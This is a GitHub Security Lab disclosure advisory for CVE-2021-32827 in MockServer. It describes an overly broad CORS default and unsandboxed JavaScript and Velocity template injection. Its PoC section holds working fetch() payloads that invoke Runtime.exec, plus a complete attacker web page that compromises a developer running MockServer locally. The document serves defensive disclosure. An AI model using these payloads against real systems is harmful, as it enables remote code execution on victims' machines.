<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 21, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-059: Arbitrary code execution in MockServer - CVE-2021-32827</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-03-26: <a href="https://github.com/mock-server/mockserver/issues/1004">Requested security contact</a></li>
  <li>2021-04-27: Reported to jamesdbloom@gmail.com</li>
  <li>2021-05-20: Tried to ping maintainers in MocKServer Slack channel</li>
  <li>2021-07-05: Deadline expired</li>
  <li>2021-07-05: Publication as per our disclosure policy</li>
</ul>

<h2 id="summary">Summary</h2>
<p>An attacker that can trick a victim into visiting a malicious site while running MockServer locally, will be able to run arbitrary code on the MockServer machine.</p>

<h2 id="product">Product</h2>
<p>MockServer</p>

<h2 id="tested-version">Tested Version</h2>
<p>5.11.2</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-insecure-default-cors-configuration">Issue 1: Insecure default CORS configuration</h3>
<p>As described in the <a href="https://mock-server.com/mock_server/CORS_support.html">documentation</a>, MockServer with an overly broad default CORS configuration allows any site to send cross-site requests:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Access-Control-Allow-Origin: "*"
Access-Control-Allow-Methods: "CONNECT, DELETE, GET, HEAD, OPTIONS, POST, PUT, PATCH, TRACE"
Access-Control-Allow-Headers: "Allow, Content-Encoding, Content-Length, Content-Type, ETag, Expires, Last-Modified, Location, Server, Vary"
Access-Control-Expose-Headers: "Allow, Content-Encoding, Content-Length, Content-Type, ETag, Expires, Last-Modified, Location, Server, Vary"
Access-Control-Max-Age: "300"
</code></pre></div></div>

<h4 id="impact">Impact</h4>
<p>This issue may allow any site to send requests to the REST API.</p>

<h3 id="issue-2-script-injection">Issue 2: Script injection</h3>
<p>MockServer allows you to create dynamic expectations using <a href="https://mock-server.com/mock_server/creating_expectations.html#button_javascript_templated_response">Javascript</a> or <a href="https://mock-server.com/mock_server/creating_expectations.html#button_javascript_velocity_templated_response">Velocity</a> <a href="https://github.com/mock-server/mockserver/blob/33ce88631b4e3d09b499caccfe1f7897f9fc8f18/mockserver-core/src/main/java/org/mockserver/mock/action/http/HttpResponseTemplateActionHandler.java#L23">templates</a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">TemplateEngine</span> <span class="n">templateEngine</span><span class="o">;</span>
<span class="k">switch</span> <span class="o">(</span><span class="n">httpTemplate</span><span class="o">.</span><span class="na">getTemplateType</span><span class="o">())</span> <span class="o">{</span>
    <span class="k">case</span> <span class="nl">VELOCITY:</span>
        <span class="n">templateEngine</span> <span class="o">=</span> <span class="n">velocityTemplateEngine</span><span class="o">;</span>
        <span class="k">break</span><span class="o">;</span>
    <span class="k">case</span> <span class="nl">JAVASCRIPT:</span>
        <span class="n">templateEngine</span> <span class="o">=</span> <span class="n">javaScriptTemplateEngine</span><span class="o">;</span>
        <span class="k">break</span><span class="o">;</span>
    <span class="k">default</span><span class="o">:</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="s">"Unknown no template engine available for "</span> <span class="o">+</span> <span class="n">httpTemplate</span><span class="o">.</span><span class="na">getTemplateType</span><span class="o">());</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Javascript templates are evaluated using an <a href="https://github.com/mock-server/mockserver/blob/33ce88631b4e3d09b499caccfe1f7897f9fc8f18/mockserver-core/src/main/java/org/mockserver/templates/engine/javascript/JavaScriptTemplateEngine.java#L34-L40">unsandboxed Nashorn engine</a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="nf">JavaScriptTemplateEngine</span><span class="o">(</span><span class="nc">MockServerLogger</span> <span class="n">logFormatter</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">engine</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">engine</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ScriptEngineManager</span><span class="o">().</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"nashorn"</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">this</span><span class="o">.</span><span class="na">logFormatter</span> <span class="o">=</span> <span class="n">logFormatter</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">httpTemplateOutputDeserializer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HttpTemplateOutputDeserializer</span><span class="o">(</span><span class="n">logFormatter</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>User-supplied templates are evaluated in <a href="https://github.com/mock-server/mockserver/blob/33ce88631b4e3d09b499caccfe1f7897f9fc8f18/mockserver-core/src/main/java/org/mockserver/templates/engine/javascript/JavaScriptTemplateEngine.java#L43"><code class="language-plaintext highlighter-rouge">executeTemplate</code></a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">script</span> <span class="o">=</span> <span class="s">"function handle(request) {"</span> <span class="o">+</span> <span class="n">indentAndToString</span><span class="o">(</span><span class="n">template</span><span class="o">)[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s">"}"</span><span class="o">;</span>
<span class="o">...</span>
<span class="nc">CompiledScript</span> <span class="n">compiledScript</span> <span class="o">=</span> <span class="n">compilable</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="n">script</span> <span class="o">+</span> <span class="s">" function serialise(request) { return JSON.stringify(handle(JSON.parse(request)), null, 2); }"</span><span class="o">);</span>
<span class="nc">Bindings</span> <span class="n">bindings</span> <span class="o">=</span> <span class="n">engine</span><span class="o">.</span><span class="na">createBindings</span><span class="o">();</span>
<span class="n">compiledScript</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="n">bindings</span><span class="o">);</span>
</code></pre></div></div>

<p>Velocity uses a script engine configured with <a href="https://github.com/mock-server/mockserver/blob/33ce88631b4e3d09b499caccfe1f7897f9fc8f18/mockserver-core/src/main/java/org/mockserver/templates/engine/velocity/VelocityTemplateEngine.java#L38-L41"><code class="language-plaintext highlighter-rouge">VelocityScriptEngineFactory</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">static</span> <span class="o">{</span>
  <span class="n">manager</span><span class="o">.</span><span class="na">registerEngineName</span><span class="o">(</span><span class="s">"velocity"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">VelocityScriptEngineFactory</span><span class="o">());</span>
  <span class="n">engine</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"velocity"</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>and then evaluates user-supplied templates in <a href="https://github.com/mock-server/mockserver/blob/33ce88631b4e3d09b499caccfe1f7897f9fc8f18/mockserver-core/src/main/java/org/mockserver/templates/engine/velocity/VelocityTemplateEngine.java#L49"><code class="language-plaintext highlighter-rouge">executeTemplate</code></a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Writer</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringWriter</span><span class="o">();</span>
<span class="nc">ScriptContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleScriptContext</span><span class="o">();</span>
<span class="n">context</span><span class="o">.</span><span class="na">setWriter</span><span class="o">(</span><span class="n">writer</span><span class="o">);</span>
<span class="n">context</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"request"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">HttpRequestTemplateObject</span><span class="o">(</span><span class="n">request</span><span class="o">),</span> <span class="nc">ScriptContext</span><span class="o">.</span><span class="na">ENGINE_SCOPE</span><span class="o">);</span>
<span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="n">template</span><span class="o">,</span> <span class="n">context</span><span class="o">);</span>
</code></pre></div></div>

<p>Both engines may allow an attacker to execute arbitrary code on-behalf of MockServer.</p>

<h4 id="poc">PoC</h4>
<p>Javascript payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fetch('http://localhost:1080/mockserver/expectation', {
  method: 'PUT',
  body: JSON.stringify({
    "httpRequest": {
      "path": "/pwn/me", "queryStringParameters": {"script": [".*"]}
    },
    "httpResponseTemplate": {
      "template": "return { statusCode: 200, body: String(this.engine.factory.scriptEngine.eval(request.queryStringParameters.script[0])) };",
      "templateType": "JAVASCRIPT"
    }
  })
})
</code></pre></div></div>

<p>Velocity payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fetch('http://localhost:1080/mockserver/expectation', {
  method: 'PUT',
  body: JSON.stringify({
    "httpRequest": {
      "path": "/pwn/me", "queryStringParameters": {"cmd": [".*"]}
    },
    "httpResponseTemplate": {
      "template": "{ \"statusCode\": 200, \"body\": \"$!request.class.forName('java.lang.Runtime').getRuntime().exec($!request.queryStringParameters.cmd[0])\" }",
      "templateType": "VELOCITY"
    }
  })
})
</code></pre></div></div>

<p>Putting the two issues together (Overly broad CORS configuration + Script injection), an attacker could serve the following page so that if a developer running MockServer visits it, they will get compromised:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Creating Expectation</span><span class="dl">"</span><span class="p">)</span>
      <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://localhost:1080/mockserver/expectation</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">PUT</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
          <span class="dl">"</span><span class="s2">httpRequest</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/pwn/me</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">queryStringParameters</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">cmd</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">.*</span><span class="dl">"</span><span class="p">]}</span>
            <span class="c1">//"queryStringParameters": {"script": [".*"]}</span>
          <span class="p">},</span>
          <span class="dl">"</span><span class="s2">httpResponseTemplate</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">template</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">{ </span><span class="se">\"</span><span class="s2">statusCode</span><span class="se">\"</span><span class="s2">: 200, </span><span class="se">\"</span><span class="s2">body</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">$!request.class.forName('java.lang.Runtime').getRuntime().exec($!request.queryStringParameters.cmd[0])</span><span class="se">\"</span><span class="s2"> }</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">templateType</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">VELOCITY</span><span class="dl">"</span>
            <span class="c1">//"template": "return { statusCode: 200, body: String(this.engine.factory.scriptEngine.eval(request.queryStringParameters.script[0])) };",</span>
            <span class="c1">//"templateType": "JAVASCRIPT"</span>
          <span class="p">}</span>
        <span class="p">})</span>
      <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">text</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">PUT</span><span class="dl">"</span><span class="p">,</span> <span class="nx">text</span><span class="p">)</span>
        <span class="p">});</span>
      <span class="p">}).</span><span class="k">catch</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
      <span class="p">});</span>

      <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Triggering exploit</span><span class="dl">"</span><span class="p">)</span>
        <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://localhost:1080/pwn/me?cmd=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="dl">'</span><span class="s1">touch /tmp/pwned</span><span class="dl">'</span><span class="p">)</span>
        <span class="c1">//var url = 'http://localhost:1080/pwn/me?script=' + encodeURIComponent('java.lang.Runtime.getRuntime().exec("touch /tmp/pwned")')</span>
        <span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span>
          <span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cors</span><span class="dl">'</span>
        <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">text</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">text</span><span class="p">)</span>
          <span class="p">});</span>
        <span class="p">}).</span><span class="k">catch</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
          <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
        <span class="p">});</span>
      <span class="p">},</span> <span class="mi">1000</span><span class="p">)</span>
    <span class="p">})();</span>
  <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32827</li>
</ul>

<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-059</code> in any communication regarding this issue.</p>


   